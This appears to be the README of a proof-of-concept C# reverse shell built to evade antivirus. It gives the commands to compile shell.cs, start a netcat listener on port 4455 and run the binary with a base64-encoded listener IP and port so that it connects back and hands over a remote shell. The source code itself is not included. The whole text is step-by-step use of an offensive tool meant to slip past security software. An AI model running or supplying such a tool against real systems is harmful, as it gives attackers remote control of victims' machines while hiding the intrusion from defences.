# C# Reverse Shell AV Evasion POC

## 🛠 Compile

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe shell.cs


## 📡 Start the Listener

nc -nvlp 4455


## 🚀 Execute the Binary

shell.exe MTkyLjE2OC41LjU= NDQ1NQ==


## 🔎 Notes

- **Base64 encoded listener IP**: `MTkyLjE2OC41LjU=` → `192.168.5.5`
- **Base64 encoded listening port**: `NDQ1NQ==` → `4455`
